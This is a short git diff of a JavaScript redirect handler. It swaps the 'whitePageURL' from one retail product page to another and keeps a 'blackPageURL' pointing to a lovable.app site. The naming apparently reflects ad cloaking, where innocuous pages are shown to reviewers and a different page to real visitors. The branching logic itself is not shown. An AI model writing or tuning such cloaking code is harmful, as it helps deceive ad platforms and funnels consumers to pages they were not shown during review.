@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/ledlenser-led-stirnlampe-h19r-signature-schwarz-4000-lumen-330m-leuchtweite-374g-20-std-ip68-wiederaufladbar-CS00420B5/";
+    const whitePageURL = "https://iloveminti.com/collections/summer-2526-boys-sweats/products/mnt1124-s25-sut-cr";
     const blackPageURL = "https://nowhereher.lovable.app/";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
